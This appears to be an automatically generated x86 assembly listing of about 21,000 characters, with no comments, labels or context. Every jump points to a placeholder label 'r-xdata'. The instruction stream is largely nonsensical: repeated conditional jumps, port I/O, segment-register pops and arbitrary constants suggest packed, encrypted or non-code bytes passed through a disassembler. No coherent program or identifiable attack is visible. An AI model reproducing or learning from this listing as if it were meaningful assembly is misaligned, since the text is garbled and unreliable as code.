jae r-xdata
jae r-xdata
sbb eax 0xb361ecc3
sbb [ esp + ebx ] bl
or edx [ edi ]
cli
jecxz r-xdata
sbb al 0x93
out dx eax
sbb al 0x93
jmp r-xdata
push 0x73202a22
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push ds
sbb al 0x1c
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ edx ]
mov ah cl
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x34
jae r-xdata
jae r-xdata
in al dx
and [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x1c326e0a
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
push 0x18d60b1b
jae r-xdata
jecxz r-xdata
sbb al 0x1c
sbb [ esp + ebx ] bl
jae r-xdata
jecxz r-xdata
in al dx
and bp sp
jpe r-xdata
jae r-xdata
pop ds
jae r-xdata
mov bl 0x1c
or ch [ edx - 0x12 ]
jae r-xdata
jae r-xdata
push ecx
aaa
jae r-xdata
jae r-xdata
mov ebx esp
jae r-xdata
sbb al 0xa6
in al dx
popad
mov bl 0x18
sbb al 0x1c
push 0xe2e78b1b
outsb
jcxz r-xdata
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
jae r-xdata
out dx eax
jae r-xdata
dec eax
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
cmp ah ch
sbb al 0x66
jae r-xdata
outsb
out dx al
jae r-xdata
cmp cl [ edx ]
jae r-xdata
push 0x326e0a3d
sbb al 0x1c
mov [ 0xffffffffe3e70f0a ] eax
jae r-xdata
enter 0x20e2 0x73
jae r-xdata
mov esp ebx
jae r-xdata
out dx eax
jae r-xdata
sti
jpo r-xdata
or dh [ 0x73e3e3f2 ]
pushad
jae r-xdata
sbb ebx [ esi ]
jae r-xdata
sbb bl [ esp + ebx ]
mov ecx [ esi ]
sbb [ eax - 0x5ef44a8b ] al
sbb [ esp + ebx ] bl
mov ecx [ eax - 0x4a5e5e17 ]
rcr [ edx ] 0x1
sbb al 0x1c
jecxz r-xdata
jae r-xdata
or dh [ edi - 0x14 ]
jecxz r-xdata
jae r-xdata
push cx
mov ecx 0x6a858089
push 0xec156613
or edx eax
sbb bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
daa
sbb al 0x60
jae r-xdata
or [ ecx ] 0xffffffe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x96
jmp r-xdata
or esp [ esi + 0x5 ]
sbb al 0x1c
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jmp r-xdata
leave
jecxz r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
mov dh 0x68
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb
inc ebx
in al dx
jecxz r-xdata
add [ esp + ebx ] bl
jecxz r-xdata
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
jg r-xdata
xor bl [ esp + ebx ]
or ch [ esi + 0x731c1c33 ]
mov edi esp
mov esp ebx
shl ebx cl
add eax 0x766e1c1c
adc ebx [ eax ]
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xec1c663b
shl [ ebx ] 0x1
outsb
or cl [ eax + 0x1 ]
jecxz r-xdata
sbb al 0xb5
jmp r-xdata
iretd
fwait
loope r-xdata
mul ebx
jecxz r-xdata
push ebx
cmp al 0x1c
sbb al 0x60
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
outsb
outsb
adc ebx [ eax ]
jecxz r-xdata
mov [ ebx - 0x1c18f0f6 ] esp
jae r-xdata
pushad
sahf
pop ds
jecxz r-xdata
or edi [ ebp - 0x451c1c18 ]
mov edx 0x67ec2366
mov bl 0x32
movsd [ di ] [ si ]
xor bl [ esp + ebx ]
sbb al 0x96
pop ds
mov bl 0xa
jbe r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
outsd
jecxz r-xdata
dec edi
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
loop r-xdata
punpckldq mmx1 [ edi ]
outsd
out 0xe3 eax
jecxz r-xdata
or cl [ edi ]
jae r-xdata
jne r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata

jae r-xdata
loopne r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
mov ah 0xa
out 0xe3 eax
sbb al 0x1c
mov edx 0xec2366ba
mov bl 0x32
mov edx 0x13ae6a85
or cl ah
xor eax 0x6e731c1c
sub bx [ esi ]
jae r-xdata
jae r-xdata
dec ebx
and bl 0xe3
and al 0xa7
jae r-xdata
daa
test [ edx ] 0x1c1c1fcf
jae r-xdata
jae r-xdata
jecxz r-xdata
jne r-xdata
mov edx 0x7a1c1c7d
jecxz r-xdata
outsb
jae r-xdata
mul [ esi + 0x23 ]
or dl bh
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
cmc
push 0xa66a8521
sti
or dl [ ebp + 0x731c1c32 ]
jae r-xdata
mov [ ecx + edi * 4 + 0x6a858089 ] ecx
sbb al 0x1c
jae r-xdata
jae r-xdata
xchg esi eax
or ebx [ esp + esi * 2 ]
jpo r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
fsub [ eax ]
in al dx
adc al 0x1a
mov ah 0xb1
jae r-xdata
jae r-xdata
pop edx
sbb al 0xe3
jecxz r-xdata
mov edx 0x7a1c1c7d
jae r-xdata
push 0x1ce38913
and ecx [ edx ]
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
scasb [ edi ]
xor ebx [ esp + ebx ]
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
or bh [ ecx + 0x39 ]
sbb al 0x1c
jae r-xdata
out 0x8b eax
jecxz r-xdata
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
fsub [ esi + 0x35d70aeb ]
sbb al 0x1c
jae r-xdata
and [ edx ] ecx
or cl [ ebx - 0x1a ]
jecxz r-xdata
or ch dl
jmp ebx
jecxz r-xdata
jae r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ds
or cl [ edi ]
jmp 0x73ba2621
jae r-xdata
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ebx esp
jecxz r-xdata
jecxz r-xdata
fidivr [ esi - 0x76981311 ]
retn
jae r-xdata
sbb al 0xa7
jecxz r-xdata
and esi [ ebx - 0x764a1d77 ]
jae r-xdata
jae r-xdata
push 0x9d0abc22
pop es
sbb al 0x1c
in al 0xe3
jecxz r-xdata
and ah ch
sbb al 0x73
jae r-xdata
jae r-xdata
sbb eax 0xab51c1c
mov eax 0x7373202a
jae r-xdata
out 0x1c eax
cmpsd [ esi ] [ edi ]
push 0xe0610a0f
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
xor eax 0x73e3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
or edx [ esi ]
jae r-xdata
jecxz r-xdata
mov ch 0x9b
jae r-xdata
jae r-xdata
outsb
sbb al 0x73
jae r-xdata
mov esp ebx
jecxz r-xdata
mov edi 0x67ecf7c7
outsd
or bl [ ebx + 0x73e3e3e1 ]
loop r-xdata
jae r-xdata
jmp ebx
jecxz r-xdata
loopne r-xdata
mov edx esp
jae r-xdata
or al [ ebp + ebx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp edx
jae r-xdata
sbb al 0x73
or al [ ebp + ebx + 0x1c ]
jae r-xdata
pop ebp
out 0xe3 eax
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
mov bl 0x89
jae r-xdata
mov eax 0xae3e3e2
jae r-xdata
and bh [ edx + ecx + 0x1c1c079d ]
jae r-xdata
jecxz r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
imul ebp ebx 0x68
cmpsb [ esi ] [ edi ]
pop ds
mov [ 0xa1fa66a ] eax
add eax 0x731c1c0c
daa
jae r-xdata
jae r-xdata
sbb al 0x97
cmp eax 0x27601c1c
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
jae r-xdata
or bl dl
cmp ebx [ esp + ebx ]
fwait
imul esp edi 0xffffffda
shl [ ecx ] 0x1
push 0xf3961422
movsd [ edi ] [ esi ]
xor [ edx ] cx
stc
jae r-xdata
push ebp
jae r-xdata
jae r-xdata
out dx eax
in al dx
mov ebx eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f0 ]
jae r-xdata
or [ 0x480a1c1c ] 0xe3f2
jae r-xdata
or [ ds : esp + ebx ] ebx
bound bx [ 0xab51c1c ]
mov ch 0x89
jae r-xdata
xchg edi eax
jae r-xdata
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
inc esp
jae r-xdata
loope r-xdata
sub ch ah
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x75
mov eax esp
loop r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
push esp
das
cmp eax 0x1c40348e
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
loop r-xdata
aaa
jae r-xdata
scasb [ edi ]
pop ds
mov dl 0xb3
mov ecx esp
mov edi [ 0x1c40348e ]
jae r-xdata
sbb al 0x96
lea eax [ ebp - 0x5c385896 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
or eax 0x480a1c1c
jae r-xdata
jae r-xdata
sti
jae r-xdata
jae r-xdata
or ah [ eax + 0x1d ]
sbb al 0x1c
jae r-xdata
mov ch 0x97
jae r-xdata
jae r-xdata
jae r-xdata
or [ 0x480a1c1c ] 0x73e3e3f2
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
xor eax [ bp + di ]
sub ch ah
jae r-xdata
mov dl 0xb3
test [ edx - 0x59 ] ebp
jae r-xdata
mov ax 0xe3e2
jecxz r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
fiadd [ ebx - 0x131c1cf7 ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
outsb
sub bx [ esi ]
pushad
push 0xffffffa7
jae r-xdata
mov bl 0x85
push 0xffffffa7
mov ah 0xb0
sbb al 0x75
jae r-xdata
jecxz r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
or al [ esi + 0x5 ]
jae r-xdata
sbb al 0xb5
jae r-xdata
jae r-xdata
jae r-xdata
out 0x6e eax
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push 0xffffffa7
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
or dl [ ebx + 0x731c1c36 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
mov edi esp
cmpsd [ esi ] [ edi ]
sar ebx cl
or cl [ edx + ebx + 0x1c ]
sbb al 0x73
bound ecx [ edi ]
in al dx
jae r-xdata
psllq mm4 mm7
mov al 0x1c
jne r-xdata
dec ebx
out 0xe3 al
jecxz r-xdata
ror [ edx ] cl
pop es
jae r-xdata
sbb al 0x1c
mov bl 0x1c
sub ebx [ esi ]
mov edx 0xec2366bc
jl r-xdata
cld
mov ebx edx
or al [ edi ]
jae r-xdata
sbb al 0x1c
or cl cl
sbb [ esp + ebx ] bl
mov [ ebx + 0x1fa66a85 ] ebx
test [ edx - 0x52 ] ebp
adc eax 0x7a66eba
mov bl 0xa
and edi esi
jecxz r-xdata
sub ebx [ esi ]
jae r-xdata
jae r-xdata
test [ edx - 0x59 ] ebp
jae r-xdata
dec eax
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
add eax 0x73731c1c
jae r-xdata
xchg edi eax
jae r-xdata
or cl [ eax - 0xe ]
jae r-xdata
jae r-xdata
inc esi
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
xor eax [ ebx ]
jae r-xdata
jecxz r-xdata
adc ecx [ ecx - 0x644ae31d ]
sbb al 0x1c
or esi [ ebx + 0x5 ]
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
or esi [ ebx + 0x6f6e6eb5 ]
push ds
sbb al 0x1c
or esp [ esi + 0x5 ]
sbb al 0x1c
mov edx 0x4930aba
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a85e289
cmpsd [ esi ] [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
outsb
cmp edi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sub [ esp + ebx ] bh
jae r-xdata
jae r-xdata
pushad
lahf
sbb [ esp + ebx ] ebx
jecxz r-xdata
in al dx
jae r-xdata
arpl bx sp
mov [ 0xffffffff85e289bb ] eax
push 0xffffffa7
jae r-xdata
mov al [ 0xfffffffff365ecfb ]
jae r-xdata
jae r-xdata
outsb
sbb al 0xb
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sbb al 0x6e
cmp al 0x1c
jae r-xdata
pushad
sahf
jae r-xdata
cmpsd [ esi ] [ edi ]
out dx eax
jg r-xdata
and bp sp
pop si
cmpsd [ esi ] [ edi ]
pushad
xchg edi eax
jecxz r-xdata
in al dx
jae r-xdata
add [ esp + ebx ] bl
fisub [ eax - 0xc9a1305 ]
jae r-xdata
add eax 0x68e3e3ef
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0x63681ba6
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
push 0xd00aebae
push ds
sbb al 0x1c
mov edx [ esi ]
sbb al 0x1c
jae r-xdata
mov ah 0xb3
push ebx
push ds
sbb al 0x1c
or ebp [ edx ]
sbb al 0x1c
and bp sp
adc ax 0x9e0a
adc eax 0x73731c1c
sti
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push 0xffffffa6
pop ds
pushad
cmpsb [ esi ] [ edi ]
pop ds
out 0xec eax
push esp
in al dx
cmp eax 0x6e1c1c0e
outsb
jae r-xdata
pop es
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
sbb ebp [ eax + 0x63 ]
jae r-xdata
sahf
sub ecx [ edx ]
push ebx
cmp al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
scasb [ edi ]
jmp r-xdata
in al dx
and eax 0x6e1c1c03
adc bx [ eax ]
sbb al 0x1c
or eax [ 0x68e3e3ef ]
and esp [ ebx + 0x7373202a ]
jae r-xdata
adc al 0x3b
clc
mov ah 0x97
jae r-xdata
in al dx
jae r-xdata
mov dl 0x1c
xchg esi eax
and ecx [ edx ]
in eax 0x1b
sbb al 0x1c
add [ gs : esp + ebx ] bl
test [ esi + 0x15 ] esp
or bl [ esi + 0x731c1c15 ]
pop ds
mov bl 0xa
dec esp
outsb
and eax 0x1c0df20b
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
or ah ch
sbb ebx [ esp + ebx ]
out dx al
and ebp ebx
arpl [ edi - 0x1d ] ax
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x3c ]
sbb al 0x1c
mov al 0xa
cmp bh bh
jecxz r-xdata
or ah [ ebx + ebp * 8 + 0x66ece3e3 ]
jae r-xdata
push 0xffffff9e
jae r-xdata
sbb al 0x1c
xor al 0x3
jae r-xdata
in al dx
mov dh 0xa
cmpsb [ esi ] [ edi ]
cmp [ esp + ebx ] bl
out 0xe3 al
or ch dh
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffff9e
pop ds
sbb al 0xb5
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
jae r-xdata
jae r-xdata
and ebp ecx
outsb
cmpsd [ esi ] [ edi ]
shl [ ebx ] 0x1
push 0xffffffa7
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0xdf20b25
jae r-xdata
jae r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
je r-xdata
push 0xb5b0b20f
and [ ecx ] ecx
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
push 0xffffffa6
jae r-xdata
jecxz r-xdata
jae r-xdata
or ch bh
jae r-xdata
or esi edx
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
xor eax 0x961c1c1c
pop ss
sbb al 0xb4
mov bl 0x89
sbb al 0xa

jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
or al [ eax - 0x1b ]
jecxz r-xdata
sbb al 0x1c
or ch dl
cmp eax 0x73731c1c
sbb al 0x1c
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
adc eax 0x85bb8689
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
push 0xffffffa6
pop ss
or bl [ esi - 0x49e3e3d4 ]
or al [ ecx + 0x3c ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
xchg esp eax
adc [ ecx + 0x57a62486 ] 0xbb
xchg [ ebp + 0x5ba624b5 ] cl
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah 0xb
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x720a8c89
aaa
jae r-xdata
jae r-xdata
sahf
out dx eax
jecxz r-xdata
out dx eax
jecxz r-xdata
jae r-xdata
pushad
pxor mmx1 [ ecx + 0xd310aeb ]
sbb al 0x1c
jae r-xdata
jae r-xdata
xor ebp esp
push esp
pushad
and ah cl
or cl [ edx + 0x731c1c15 ]
jae r-xdata
sub bh ch
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xa
jae r-xdata
mov bl 0x6a
jae r-xdata
cli
mov [ edx + ecx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] cl
jno r-xdata
jpe r-xdata
sahf
sbb al 0x96
jae r-xdata
aas
jae r-xdata
mov ebx esi
outsb
daa
mov bl 0xa
mov ecx 0x731c1c18
jae r-xdata
das
and al 0xa6
jae r-xdata
lahf
jae r-xdata
jae r-xdata
mov [ edx ] cs
jae r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
out dx eax
int3
cld
jae r-xdata
jecxz r-xdata
jae r-xdata
or ah [ edi + ebp * 8 + 0x6e73e3e3 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x1c14060a ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
adc [ esp + ebx ] bl
adc ch [ edi ]
sbb al 0x1c
mov edx 0x66ec2366
pop esi
xor al 0x3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
dec ecx
jmp 0xffffffff88ba2984
imul edx [ ebx - 0x1d ] 0xffffffe3
jae r-xdata
add eax 0xf5810abb
jecxz r-xdata
sbb eax [ ebp + 0xa1b9e6a ]
sub cl [ edx ]
jae r-xdata
in al dx
sbb al 0x1c
jae r-xdata
jmp r-xdata
xchg esi eax
sbb al 0x1c
mov esp ebx
jecxz r-xdata
push 0xffffff9e
jae r-xdata
jae r-xdata
jecxz r-xdata
mov esi 0xeb280a3b
jae r-xdata
sub bl ch
or esi [ edi ]
mov bl 0x1c
jae r-xdata
mov edx 0x6a85bb89
cmpsb [ esi ] [ edi ]
pop ss
test [ edx - 0x52 ] ebp
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
sbb al 0x73
sbb al 0x1c
jb r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
and edi [ ebp + 0x73202ab8 ]
outsb
jae r-xdata
add ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sub ah [ eax ]
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
or bl [ eax + 0x731c1c30 ]
jae r-xdata
or dh [ ecx + 0xf ]
outsb
cmpsb [ esi ] [ edi ]
cmp esi [ ebx + 0x6a3f961c ]
jae r-xdata
sbb al 0x1c
mov [ ebx - 0x7a5b7647 ] ebx
push 0xffffffb6
jns r-xdata
push ds
lahf
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebp + 0x3a260bb3 ]
sbb al 0x1c
mov ch 0x8b
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata

or ch [ eax ]
jae r-xdata
jae r-xdata
scasb [ edi ]
scasb [ edi ]
jae r-xdata
mov bl 0x1c
je r-xdata
xchg di ax
sbb [ esp + ebx ] bl
jae r-xdata
sbb al 0x1c
jecxz r-xdata
mov bl 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
jae r-xdata
jae r-xdata
out 0xa eax
movsb [ edi ] [ esi ]
in al dx
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
sahf
pop ds
in al dx
sbb al 0xf0
jecxz r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
sub esi [ ebx - 0x5f5e377 ]
jae r-xdata
sbb al 0xd0
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
dec edi
push 0xab3eb96
mov dh 0x41
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
mov ecx 0x45ae6a85
mov [ esi + 0x7fb66a85 ] edx
mov ecx 0x7db66a85
test [ edx - 0x5a ] ebp
dec ecx
push 0x8923d035
xchg edi eax
test [ edx - 0x4a ] ebp
inc ecx
jae r-xdata
pushad
jae r-xdata
jmp r-xdata
jae r-xdata
outsb
mov ebx 0xf710a86
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
pop edi
jecxz r-xdata
daa
fisttp [ edx ]
inc ebp
xor eax 0x6a851c1c
scasb [ edi ]
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata

jae r-xdata
jae r-xdata
mov ah 0xb0
mov ah 0x89
sbb al 0xa
0x731c1c3d 0x7373
jae r-xdata
jae r-xdata
and ebp [ edx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
test [ esi + 0x2a ] esp
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
cwde
xor [ esp + ebx ] bl
sub cl [ edx ]
jae r-xdata
cmp ecx [ edx ]
fwait
push ds
sbb al 0x1c
mov al 0xb3
or al dh
call 0x73ba2bc4
sbb al 0x74
or esp ebx
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
or bl [ eax - 0x5 ]
jecxz r-xdata
sbb al 0x1c
or ah [ ebx + 0x731c1c10 ]
mov [ ebx + 0x17a66a85 ] edi
jae r-xdata
jae r-xdata
jae r-xdata
or bh dl
and [ ebx + 0x73 ] dh
pushad
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
pop ds
or al [ ebp + 0x7373e3e3 ]
jae r-xdata
pop ss
push 0xffffff9e
insd
or al 0x1c
sbb al 0xb2
sbb al 0x96
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
mov edx ebp
jecxz r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffae
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x731c1c16 ]
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb esp eax
scasb [ edi ]
pop ds
xor esp edx
loop r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x6e
sahf
cmp ebp [ esi + 0x6e ]
push ebx
push ds
sbb al 0x1c
or ebx [ ecx ]
sub ebx [ esp + ebx ]
and bp sp
pop ds
cmp [ esp + ebx ] ebx
or bh [ eax + 0x731c1c33 ]
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
or esi ebx
jae r-xdata
jae r-xdata
add esi [ ebx + 0x1897666e ]
sbb al 0x1c
sub edx [ ecx + 0x24aeb586 ]
and al 0xa6
inc ebp
jae r-xdata
or edx eax
and ecx [ edx ]
inc eax
in eax 0xe3
jecxz r-xdata
jae r-xdata
mov dl 0xb0
jae r-xdata
xchg edi eax
adc al 0x1c
mov ebx eax
test [ edx - 0x5a ] ebp
sar [ eax ] 0x1
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
jne r-xdata
or ah [ ecx + 0x16 ]
jae r-xdata
jae r-xdata
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jae r-xdata
dec ebp
push 0x2fa66e2d
test [ edx - 0x6a ] ebp
push 0xffffffa6
mov ebx ebp
sbb al 0x1c
shr [ edx ] 0x1
mov [ 0xab42bc8 ] al
push edi
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
out dx eax
mov ch 0xb4
or esp ebx
jae r-xdata
jecxz r-xdata
[ eax - 0x53 ]
jecxz r-xdata
push esp
jae r-xdata
mov esp 0xa2366bd
push ebp
fmul [ ebx ]
jae r-xdata
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xb0
push 0x5e
aaa
ja r-xdata
sahf
or esp [ ecx - 0x45e3e3ff ]
jae r-xdata
jecxz r-xdata
loop r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
or al [ eax ]
xor eax 0x73731c1c
jae r-xdata
mov edi 0xb32354ec
jae r-xdata
jae r-xdata
int1
cmp [ esp + ebx ] bl
outsb
sbb al 0x66
and ebp esp
and bp sp
sti
mov ch 0xb
mov eax [ 0xffffffffba1c1c01 ]
jae r-xdata
or dh [ ecx ]
or eax 0x73731c1c
jae r-xdata
mov al 0xa
unpckhps xmm3 [ esp + ebx ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
mov bl 0x68
jae r-xdata
adc bl [ esp + ebx ]
in al dx
jae r-xdata
xchg ecx eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edi 0xbdc0abb
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov [ edi + 0x1c07710a ] esp
sbb al 0x73
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
mov ch 0x89
cmpsd [ esi ] [ edi ]
or dh [ ecx + 0x7 ]
sbb al 0x1c
sbb ecx [ ecx - 0x6f54465 ]
xor ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x5a ] ebp
adc [ ebx + 0x6a85cd89 ] edi
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0x15a66a85
mov [ esi - 0x59957a45 ] eax
fisttp [ 0x73731c1c ]
mov esi [ ebx ]
loop r-xdata
jae r-xdata
jae r-xdata
in al dx
nop
and eax 0x1c34c70b
jae r-xdata
push esp
cld
sbb al 0xec
jae r-xdata
or ch [ ecx + 0x12 ]
sbb al 0x1c
jae r-xdata
or dh ah
xor edi [ ebx + 0x1c0c370a ]
push 0xffffffa6
jae r-xdata
outsb
je r-xdata
jae r-xdata
or bl ah
jae r-xdata
jecxz r-xdata
sahf
or ecx [ edx ]
0x731c1c19 0x7373
jae r-xdata
mov sp 0x1c39
jae r-xdata
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
shl [ ebx ] 0x1
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
daa
jecxz r-xdata
sub [ ecx + ecx * 4 - 0x49957a5f ] edi
jpo r-xdata
push 0xffffff9e
jecxz r-xdata
jae r-xdata
and esi [ ebx - 0x38f4da98 ]
jae r-xdata
push ds
sbb al 0x1c
sbb al 0xb5
sub [ esp + ebx ] ebx
jae r-xdata
